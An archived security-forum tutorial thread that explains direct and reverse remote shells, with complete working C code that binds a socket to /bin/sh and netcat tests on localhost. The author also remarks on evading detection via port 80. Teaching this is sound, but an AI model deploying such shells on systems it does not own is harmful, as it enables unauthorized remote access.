<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Remote Shells. Part I - #11 by AgentSniff - Networking - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those service&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="../269.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Remote Shells. Part I&#39;" href="../269.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/remote-shells-part-i/269/11" />
<meta name="twitter:url" content="https://0x00sec.org/t/remote-shells-part-i/269/11" />
<meta property="og:title" content="Remote Shells. Part I" />
<meta name="twitter:title" content="Remote Shells. Part I" />
<meta property="og:description" content="Thank you man!  i will try it as soon as possible!" />
<meta name="twitter:description" content="Thank you man!  i will try it as soon as possible!" />
<meta property="og:article:section" content="Networking" />
<meta property="og:article:section:color" content="8C6238" />
<meta property="og:article:tag" content="shell" />
<meta property="og:article:tag" content="c" />
<meta property="og:article:tag" content="networking" />
<meta property="article:published_time" content="2016-05-13T00:49:30+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="../269.html">Remote Shells. Part I</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../../c/networking/63.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #8C6238"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Networking</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../../tag/shell.html" class="discourse-tag" rel="tag">shell</a>,
<a href="../../../tag/c.html" class="discourse-tag" rel="tag">c</a>,
<a href="../../../tag/networking.html" class="discourse-tag" rel="tag">networking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Remote Shells. Part I">
<meta itemprop="articleSection" content="Networking">
<meta itemprop="keywords" content="shell, c, networking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-09T17:28:34Z" class="post-time">
May 9, 2016, 5:28pm
</time>
<meta itemprop="dateModified" content="2016-05-12T12:35:55Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shell program…</p>
<p><strong>LEVEL:Beginner</strong></p>
<h2>Remote Shell Use Cases</h2>
<p>I have written and deployed remote shells a couple of times for completely legitimated reasons in my own boxes. For instance, once I need shell access to my Android phone to debug some other application. I tried a couple of SSH servers but they were performing poorly, so I ended up, deploying a small binary to remotely access it.</p>
<p>From a security point of view, a remote shell is usually part of a shellcode to enable unauthorized remote access to a system.</p>
<h2>Remote Shell Types</h2>
<p>There are basically two ways to get remote shell access:</p>
<ul>
<li>
<strong>Direct Remote Shells</strong>. A direct remote shell behaves as a server. It works like a ssh or telnet server. The remote user/attacker, connects to a specific port on the target machine and gets automatically access to a shell.</li>
<li>
<strong>Reverse Remote Shells</strong>. These ones work the other way around. The application running on the target machine connects back (calls back home) to a specific server and port on a machine that belongs to the user/attacker.</li>
</ul>
<p>The Reverse Shell method has some advantages.</p>
<ul>
<li>Firewalls usually block incoming connections, but they allow outgoing connection in order to provide Internet access to the machine’s users.</li>
<li>The user/attacker does not need to know the IP of the machine running the remote shell, but s/he needs to own a system with a fixed IP, to let the target machine <strong>call home</strong>.</li>
<li>Usually there are many outgoing connections in a machine and only a few servers (if any) running on it. This makes detection a little bit harder, specially if the shell connects back to something listening on port 80…</li>
</ul>
<h2>Networking. The client</h2>
<p>Enough chatting. Let’s go into the code. We will start by writing a minimal <strong>server</strong> and <strong>client</strong> functions so we can experiment with both, direct and reverse shells. Let’s start with some includes:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;  

#include &lt;unistd.h&gt; 

#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
</code></pre>
<p>Now, we need to write some network code. First let’s write a function to establish a connection to a specific IP address and port. Something like this:</p>
<pre><code class="lang-auto">int
client_init (char *ip, int port)
{
  int                s;
  struct sockaddr_in serv;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) &lt; 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = inet_addr(ip);

  if (connect (s, (struct sockaddr *) &amp;serv, sizeof(serv)) &lt; 0) 
    {
      perror("connect:");
      exit (EXIT_FAILURE);
    }

  return s;
}
</code></pre>
<p>The function receives as parameters an IP address to connect to and a port. Then it creates a TCP socket (<strong>SOCK_STREAM</strong>) and fills in the data for connecting. The connection is effectively established after a successful execution of connect. In case of any error (creating the socket or connection) we just stop the application.</p>
<p>This function will allow us to implement a reverse remote shell. Let’s go on with the server</p>
<h2>Networking. The Server</h2>
<p>The server function is a bit longer, but it is as straightforward as the client one. Let’s take a look to the code first:</p>
<pre><code class="lang-auto">int
server_init (int port)
{
  int                s, s1;
  socklen_t          clen;
  struct sockaddr_in serv, client;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) &lt; 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = htonl(INADDR_ANY);
  
  if ((bind (s, (struct sockaddr *)&amp;serv, 
	     sizeof(struct sockaddr_in))) &lt; 0)
    {
      perror ("bind:");
      exit (EXIT_FAILURE);
    }
  if ((listen (s, 10)) &lt; 0)
    {
      perror ("listen:");
      exit (EXIT_FAILURE);
    }
  clen = sizeof(struct sockaddr_in);
  if ((s1 = accept (s, (struct sockaddr *) &amp;client, 
		    &amp;clen)) &lt; 0)
    {
      perror ("accept:");
      exit (EXIT_FAILURE);
    }

  return s1;

}
</code></pre>
<p>As you can see, the beginning of the function is practically the same that for the client code. It creates a socket, fills in the network data, but instead of trying to connect to a remote server, it binds the socket to a specific port. Note that the address passed to <strong>bind</strong> is the constant <strong>INADDR_ANY</strong>. This is actually IP 0.0.0.0 and it means that the socket will be listening on all interfaces.</p>
<p>The <strong>bind</strong> system call does not really make the socket a <strong>listening</strong> socket (you can actually call <strong>bind</strong> on a client socket). It is the <strong>listen</strong> system call the one that makes the socket a server socket. The second parameter passed to <strong>listen</strong> is the backlog. Basically it indicates how many connections will be queued to be accepted before the server starts rejecting connections. In our case it just do not really matter.</p>
<p>At this point, our server is setup and we can accept connections. The call to the <strong>accept</strong> system call will make our server wait for an incoming connection. Whenever it arrives a new socket will be created to interchange data with the new client.</p>
<h2>Starting a Shell</h2>
<p>The last piece of our remote shell example is a function to start a shell. This is the code:</p>
<pre><code class="lang-auto">int
start_shell (int s)
{
  char *name[3] ;

  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);
  
  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}
</code></pre>
<p>Again, the function is pretty simple. It makes use of two system calls <strong>dup2</strong> and <strong>execv</strong>. The first one duplicates a given file descriptor. In this case, the three calls at the beginning of the function, assigns the file descriptor received as parameter to the Standard Input (file descriptor 0), Standard Output (file descriptor 1) and Standard Error (file descriptor 3).</p>
<p>So, if the file descriptor we pass as a parameter is one of the sockets created with our previous client and server functions, we are effectively sending and receiving data through the network every time we write data to the console and we read data from stdin.</p>
<p>Now we just execute a shell with the -i flag (interactive mode). The <strong>execv</strong> system call will substitute the current process (whose stdin,stdout and stderr are associated to a network connection) by the one passed as parameter.</p>
<p>That is basically it. We just need a main function to test our remote shell application.</p>
<h2>The main function</h2>
<p>The main function is pretty simple. Note that I’m not checking the command-line arguments. That means that if you do not pass the right arguments the application will crash. This is how the <strong>main</strong> function looks like</p>
<pre><code class="lang-auto">int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  if (argv[1][0] == 'c')
    start_shell (client_init (argv[2], atoi(argv[3])));
  else
    start_shell (server_init (atoi(argv[2])));
		  
  return 0;
}
</code></pre>
<p>The program expects to have a one letter first argument. If the argument is the character ‘c’, then it will start a reverse remote shell (running the client code) connecting back to the IP address passed as second argument and the port passed as third argument.</p>
<p>Otherwise it runs in server mode (direct remote shell) and uses the second argument as the port to bind to.</p>
<h2>Testing</h2>
<p>So, let’s test our small program. You can just compile it using <strong>make</strong>. I called my file <strong>rs.c</strong> and I compiled it just typing:</p>
<pre><code class="lang-auto">make rs
</code></pre>
<p>For the tests we will need two terminals.</p>
<p>First we will test the direct remote shell. In one terminal you have to start the application in server mode:</p>
<pre><code class="lang-auto">$ ./rs s 5000
</code></pre>
<p>This will start a TCP server waiting for connections on port 5000. Now, from another terminal use netcat to connect to the server:</p>
<pre><code class="lang-auto">$ nc 127.0.0.1 5000
</code></pre>
<p>That’s it. It is better if you run the <strong>netcat</strong> command from a different directory, otherwise it will look like nothing had happened.</p>
<p>Leave the session typing <strong>exit</strong> in your <strong>netcat</strong> terminal or pressing <strong>CTRL+D</strong> and let’s try the reverse remote shell.</p>
<p>Now we start in one of the terminals a <strong>netcat</strong> in server mode. When we run our application on the target system, it will connect back to this <strong>netcat</strong> window.</p>
<pre><code class="lang-auto">nc -l -p 5000
</code></pre>
<p>In the other terminal we start the reverse shell with a command like this:</p>
<pre><code class="lang-auto">$ ./rs c 127.0.0.1 5000
</code></pre>
<p>You will get immediately a prompt in your netcat terminal and access to the target machine that just called back home.</p>
<h2>NEXT</h2>
<p>Hope you enjoyed this basic tutorial. We will be improving this basic program in future posts, as we keep improving our network programming skills.</p>
<p>Get the code from github</p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
<a href="https://github.com/0x00pf/0x00sec_code" target="_blank" rel="noopener nofollow ugc">GitHub</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width height>
<h3><a href="https://github.com/0x00pf/0x00sec_code" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>
<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>Ask your questions (if any) in the comments!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="27" />
<span class="post-likes">27 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../remote-shells-part-ii-crypt-your-link/306.html">Remote Shells. Part II. Crypt your link</a>
<meta itemprop="position" content="2">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../remote-shells-part-iii-shell-access-your-phone/508.html">Remote Shells Part III. Shell Access your Phone</a>
<meta itemprop="position" content="3">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../remote-exploit-shellcode-without-sockets/1440.html">Remote Exploit. Shellcode without Sockets</a>
<meta itemprop="position" content="4">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../open-source-reverse-shell/3271.html">Open Source Reverse Shell</a>
<meta itemprop="position" content="5">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../how-do-those-hackers-tools-work-proxychains/426.html">How do those hackers&#39; tools work? Proxychains</a>
<meta itemprop="position" content="6">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../programming-for-wanabes-xi-introduction-to-rats/26318.html">Programming for Wanabes XI. Introduction to RATs</a>
<meta itemprop="position" content="7">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../getting-shell-on-android-and-signing-the-apk-file/3129.html">Getting Shell on Android and signing the APK File</a>
<meta itemprop="position" content="8">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/okznokz"><span itemprop="name">okznokz</span></a>
(Okznokz)
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-09T17:30:07Z" class="post-time">
May 9, 2016, 5:30pm
</time>
<meta itemprop="dateModified" content="2016-05-09T17:30:07Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks for the tutorial. Waiting for the next installment and thanks for keeping the beginners in mind. <img src="../../../images/emoji/twitter/heart_eyes.png%3Fv=9" title=":heart_eyes:" class="emoji" alt=":heart_eyes:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-09T17:38:49Z" class="post-time">
May 9, 2016, 5:38pm
</time>
<meta itemprop="dateModified" content="2016-05-09T17:38:49Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks!. Beginners are the future <img src="../../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-09T21:02:26Z" class="post-time">
May 9, 2016, 9:02pm
</time>
<meta itemprop="dateModified" content="2016-05-09T21:02:26Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Awesome post Pico! I really enjoyed this! Could to re-read it after the re-post <img src="../../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Cromical"><span itemprop="name">Cromical</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-09T23:17:24Z" class="post-time">
May 9, 2016, 11:17pm
</time>
<meta itemprop="dateModified" content="2016-05-09T23:17:24Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks for the tutorial. Included a lot of stuff I really didn’t know, so thanks for that!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-10T01:15:43Z" class="post-time">
May 10, 2016, 1:15am
</time>
<meta itemprop="dateModified" content="2016-05-10T01:15:43Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You write great code, man. I’m excited to see this progress.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Cromical"><span itemprop="name">Cromical</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-10T01:59:23Z" class="post-time">
May 10, 2016, 1:59am
</time>
<meta itemprop="dateModified" content="2016-05-10T01:59:23Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Or as I always say “beautiful code”. <img src="../../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T12:39:12Z" class="post-time">
May 12, 2016, 12:39pm
</time>
<meta itemprop="dateModified" content="2016-05-12T12:39:12Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I though I already commented here.<br>
Anyway, great post pico!!</p>
<p>No wait, I’m sure I commented before <img src="../../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T15:42:19Z" class="post-time">
May 12, 2016, 3:42pm
</time>
<meta itemprop="dateModified" content="2016-05-12T15:42:19Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You did… in the original post in the website/blog we had at the beginning</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/AgentSniff"><span itemprop="name">AgentSniff</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-13T00:49:30Z" class="post-time">
May 13, 2016, 12:49am
</time>
<meta itemprop="dateModified" content="2016-05-13T00:49:30Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you man!</p>
<p>i will try it as soon as possible!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../1337-of-the-w33k-5-9-5-13-2016/340.html">1337 of the w33k (5/9 - 5/13, 2016)</a>
<meta itemprop="position" content="1">
</div>
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-04T15:55:17Z" class="post-time">
March 4, 2017, 3:55pm
</time>
